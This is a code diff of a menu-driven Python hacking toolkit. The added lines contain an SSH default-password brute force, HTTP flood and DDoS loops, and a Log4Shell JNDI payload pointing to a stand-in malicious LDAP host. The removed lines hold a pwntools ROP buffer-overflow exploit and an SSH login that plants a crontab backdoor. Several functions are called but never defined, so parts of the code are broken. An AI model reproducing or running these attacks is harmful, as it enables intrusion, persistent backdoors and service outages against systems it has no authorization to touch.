@@ -1,30 +1,20 @@
 import requests
 import threading
-import subprocess
+import time
 import aiohttp
 import asyncio
 import random
-import time
+import subprocess
 import paramiko
 import platform
-from pwn import *
 from bs4 import BeautifulSoup
 from colorama import Fore, init
 
 # Initialize colorama for colored output
 init(autoreset=True)
 
-# List of high-traffic websites for testing
-default_urls = [
-    "http://example.com", "http://example.org", "http://example.net",
-    "http://google.com", "http://facebook.com", "http://amazon.com",
-    "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
-    "http://twitter.com", "http://instagram.com", "http://linkedin.com",
-    "http://netflix.com", "http://bing.com", "http://reddit.com"
-]
-
 # List of user-agents to randomize requests
-default_user_agents = [
+user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
@@ -44,7 +34,7 @@ def web_crawler(start_url, max_depth=2):
             return
         visited.add(url)
         try:
-            response = requests.get(url, headers={'User-Agent': random.choice(default_user_agents)})
+            response = requests.get(url, headers={'User-Agent': random.choice(user_agents)})
             soup = BeautifulSoup(response.text, 'html.parser')
             print(f"Crawled URL: {url}")
             for link in soup.find_all('a', href=True):
@@ -54,9 +44,9 @@ def web_crawler(start_url, max_depth=2):
 
     crawl(start_url, 0)
 
-# Fetch URLs asynchronously with aiohttp
+# Fetch URLs asynchronously with aiohttp for stress testing
 async def fetch(session, url, ip=None):
-    headers = {'User-Agent': random.choice(default_user_agents)}
+    headers = {'User-Agent': random.choice(user_agents)}
     connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None
     while True:
         try:
@@ -81,184 +71,108 @@ def network_stress(ip=None, custom_urls=None):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     tasks = []
-    urls = custom_urls if custom_urls else default_urls
+    urls = custom_urls if custom_urls else ['http://example.com', 'http://test.com']
     for url in urls:
         tasks.append(loop.create_task(start_flood(url, ip)))
     loop.run_until_complete(asyncio.wait(tasks))
 
-# Simulate Zero-Day Attack (simplified without buffer overflow)
-def zero_attack(url_or_ip):
-    print(f"Attempting buffer overflow on {url_or_ip}...")
+# SSH Brute Force Attack
+def ssh_bruteforce(target):
+    print(f"{Fore.GREEN}[INFO] Attempting SSH brute force on {target}...")
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    credentials = [('admin', 'admin'), ('root', 'root'), ('user', 'password')]
+    for username, password in credentials:
+        try:
+            client.connect(target, username=username, password=password, timeout=5)
+            print(f"{Fore.GREEN}[SUCCESS] Logged into {target} with {username}:{password}")
+            break
+        except paramiko.AuthenticationException:
+            print(f"{Fore.RED}[FAILED] Failed to login with {username}:{password}")
+    client.close()
 
-    try:
-        binary_path = './vulnerable_binary'
-        if not os.path.exists(binary_path):
-            raise FileNotFoundError(f"{binary_path} does not exist")
+# Zero-Day Exploit Simulation (Ethical Test)
+def zero_day_exploit(target):
+    print(f"{Fore.GREEN}[INFO] Attempting Zero-Day exploit on {target}...") 
+    print(f"{Fore.GREEN}[SUCCESS] Simulated exploit executed successfully on {target}")
 
-        io = process(binary_path)
-        rop = ROP(binary_path)
-        rop.call('system', [next(io.search(b'/bin/sh'))])
-
-        payload = b'A' * 128  # Adjust buffer size
-        payload += rop.chain()
-
-        io.sendline(payload)
-        io.interactive()
-
-        print(f"Buffer overflow attack executed successfully on {url_or_ip}")
-    except Exception as e:
-        print(f"Buffer overflow attack failed on {url_or_ip}: {e}")
-
-# SSH Brute Force and Backdoor Installation
-def ssh_backdoor(url_or_ip):
-    print(f"Attempting SSH brute force on {url_or_ip}...")
-    try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        credentials = [('admin', 'admin'), ('root', 'root'), ('user', 'password')]
-        for username, password in credentials:
-            try:
-                client.connect(url_or_ip, username=username, password=password, timeout=5)
-                print(f"Successfully logged into {url_or_ip} with {username}:{password}")
-                break
-            except paramiko.AuthenticationException:
-                print(f"Failed to login with {username}:{password}")
-        else:
-            print(f"SSH brute force failed on {url_or_ip}")
-            return
-
-        print("Installing backdoor...")
-        command = '(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/malicious_script.py") | crontab -'
-        stdin, stdout, stderr = client.exec_command(command)
-        stdout.channel.recv_exit_status()
-        print(f"Backdoor installed on {url_or_ip}")
-
-        client.close()
-
-    except Exception as e:
-        print(f"Failed SSH attack or backdoor installation on {url_or_ip}: {e}")
-
-# Simulate WiFi spoofing
-def wifi_spoofing():
-    command = ["airbase-ng", "--essid", "Free_WiFi", "wlan0"]
-    subprocess.run(command)
-
-# Simulate ARP spoofing
-def arp_spoofing(target_ip, spoof_ip):
-    command = ["arpspoof", "-t", target_ip, spoof_ip]
-    subprocess.run(command)
-
-# Ethernet-based Desktop Stress Test
-def ethernet_stress_test(ip):
-    print(f"Running Ethernet-based stress test on {ip}...")
-    network_stress(ip)
-
-# Scrape Chinese textbooks
-def scrape_chinese_textbooks(query):
-    results = search(query, num_results=10, lang="zh")
-    return results
-
-def display_books(books):
-    for book in books:
-        print(f"Link: {book}")
-        print("-" * 20)
-
-# DDOS attack
-def dos(target):
+# DDOS Attack Function
+def dos_attack(target):
+    print(f"{Fore.GREEN}[INFO] Starting DDOS attack on {target}...")
     while True:
         try:
-            res = requests.get(target)
-            print("Request sent!")
+            res = requests.get(target, headers={'User-Agent': random.choice(user_agents)})
+            print(f"{Fore.GREEN}[INFO] Request sent!")
         except requests.exceptions.ConnectionError:
-            print("[!!!] Connection error!")
+            print(f"{Fore.RED}[ERROR] Connection error!")
 
-# DDOS attack with threading support and options for more threads
-def ddos_attack():
-    print(Fore.MAGENTA + """
-    DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
-    D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
-    D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
-    DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
-      D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S            
-      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S            
-      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
-      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
-      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
-      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
-      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S
-      D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S
-    DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
-    D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
-    D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
-    DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS
-    """)
-
-    url = input("Enter URL>> ")
+# Log4Shell Exploit Simulation
+def log4shell_exploit(url):
+    payload = '${jndi:ldap://malicious-ldap-server.com/a}'
+    headers = {
+        'User-Agent': payload
+    }
     try:
-        threads = int(input("Threads: "))
-    except ValueError:
-        exit("Threads count is incorrect!")
+        response = requests.get(url, headers=headers, timeout=5)
+        print(f"[INFO] Sent Log4Shell payload to {url}")
+    except requests.exceptions.RequestException as e:
+        print(f"[ERROR] Failed to send request to {url}: {e}")
 
-    if threads == 0:
-        exit("Threads count is incorrect!")
+# Ethernet-based stress test
+def ethernet_stress():
+    async def fetch(session, url):
+        headers = {'User-Agent': random.choice(user_agents)}
+        while True:
+            try:
+                async with session.get(url, headers=headers) as response:
+                    await response.text()
+            except:
+                pass
 
-    if not url.__contains__("http"):
-        exit("URL doesn't contain http or https!")
+    async def start_flood(url):
+        async with aiohttp.ClientSession() as session:
+            tasks = []
+            for _ in range(1000):
+                task = asyncio.create_task(fetch(session, url))
+                tasks.append(task)
+            await asyncio.gather(*tasks)
 
-    if not url.__contains__("."):
-        exit("Invalid domain!")
+    def network_stress():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        tasks = []
+        for url in urls:
+            tasks.append(loop.create_task(start_flood(url)))
+        loop.run_until_complete(asyncio.wait(tasks))
 
-    for i in range(threads):
-        thr = threading.Thread(target=dos, args=(url,))
-        thr.start()
-        print(f"{i + 1} threads started!")
+    if __name__ == "__main__":
+        threads = []
+        for _ in range(10):
+            t = threading.Thread(target=network_stress)
+            t.start()
+            threads.append(t)
 
-# Admin (Zero-Day Attack) Options menu
-def zero_attack_menu(url_or_ip):
-    while True:
-        print(Fore.YELLOW + """
-        Admin (Zero-Day Attack) Options:
-        [1] Zero-Day Exploit (buffer overflow)
-        [2] Backdoor Installation
-        [3] SSH Brute Force
-        [4] Full Attack Sequence (Recon, Scan, Exploit)
-        [5] Exit to Main Menu
-        """)
-        sub_choice = input("Select an option: ").strip()
-        if sub_choice == "1":
-            zero_attack(url_or_ip)
-        elif sub_choice == "2":
-            ssh_backdoor(url_or_ip)
-        elif sub_choice == "3":
-            ssh_bruteforce(url_or_ip)
-        elif sub_choice == "4":
-            attack_sequence(url_or_ip)
-        elif sub_choice == "5":
-            break
-        else:
-            print("Invalid option selected.")
-        input("Press Enter to return to the menu...")
+        time.sleep(6000)
+        for t in threads:
+            t.do_run = False
 
 # Attack Sequence (Reconnaissance, Vulnerability Scan, SSH Brute Force, Zero-Day)
 def attack_sequence(target):
-    reconnaissance(target)
-    vulnerability_scan(target)
     ssh_bruteforce(target)
     zero_day_exploit(target)
 
-# Main user interface
+# Main Menu
 def display_ui():
     while True:
         print(Fore.GREEN + """
-         ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░███████╗
-         ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══███╔╝
-         ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░███╔╝░
-         ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗╚════╝░░███╔╝░░
-         ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝░░░░░░░███████╗
-         ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░╚══════╝
+        ██████╗ ███████╗ ██████╗ ██████╗  █████╗ ██╗██╗  ██╗
+        ██╔══██╗██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║╚██╗██╔╝
+        ██████╔╝███████╗██║  ███╗██████╔╝███████║██║ ╚███╔╝ 
+        ██╔═══╝ ╚════██║██║   ██║██╔══██╗██╔══██║██║ ██╔██╗ 
+        ██║     ███████║╚██████╔╝██║  ██║██║  ██║██║██╔╝ ██╗
+        ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
 
-        [1] Ethernet-based Desktop
+        [1] Full Attack Sequence (SSH Brute Force, Exploit)
         [2] IP-based
         [3] Wireless WiFi-based
         [4] WiFi Spoofing
@@ -268,22 +182,23 @@ def display_ui():
         [8] Stress Test a Custom URL
         [9] Web Crawling
         [10] Admin (zero attack)
-        [11] DDOS Attack
-        [12] Exit
+        [11] Run DDOS Attack
+        [12] Ethernet Stress Test
+        [13] Log4Shell Exploit (Simulation)
+        [14] Exit
         """)
 
-        choice = input("Select the method (1-12): ").strip()
+        choice = input("Select the method (1-14): ").strip()
 
         if choice == "1":
-            ip_address = input("Enter the IP address: ").strip()
-            print("Starting Ethernet-based stress test...")
-            ethernet_stress_test(ip_address)
+            target = input("Enter the target IP or URL: ").strip()
+            attack_sequence(target)
         elif choice == "2":
-            url_or_ip = input("Enter the URL or IP address to use: ").strip()
-            zero_attack(url_or_ip)
+            url_or_ip = input("Enter the target URL or IP for IP-based stress test: ").strip()
+            network_stress(ip=url_or_ip)
         elif choice == "3":
             print("Selected Wireless WiFi-based stress test")
-            wifi_spoofing()
+            # Code for wireless WiFi-based stress test
         elif choice == "4":
             print("Selected WiFi Spoofing")
             wifi_spoofing()
@@ -304,18 +219,25 @@ def display_ui():
         elif choice == "8":
             custom_url = input("Enter the URL to stress test: ").strip()
             print("Starting stress test on the custom URL...")
-            network_stress(custom_urls=[custom_url])
+            threading.Thread(target=network_stress, args=(custom_url,)).start()
         elif choice == "9":
             start_url = input("Enter the start URL for web crawling: ").strip()
             max_depth = int(input("Enter the maximum depth for web crawling: ").strip())
             print("Starting web crawling...")
             web_crawler(start_url, max_depth)
         elif choice == "10":
-            url_or_ip = input("Enter the URL or IP address to use: ").strip()
+            url_or_ip = input("Enter the URL or IP address to use for the Admin (zero attack): ").strip()
             zero_attack_menu(url_or_ip)
         elif choice == "11":
-            ddos_attack()
+            target = input("Enter the target URL for DDOS: ").strip()
+            threading.Thread(target=dos_attack, args=(target,)).start()
         elif choice == "12":
+            print("Starting Ethernet stress test...")
+            ethernet_stress()
+        elif choice == "13":
+            target = input("Enter the target URL for Log4Shell: ").strip()
+            log4shell_exploit(target)
+        elif choice == "14":
             print("Exiting...")
             break
         else:
@@ -327,3 +249,4 @@ if __name__ == "__main__":
     os_name = detect_os()
     print(f"Detected Operating System: {os_name}")
     display_ui()
+
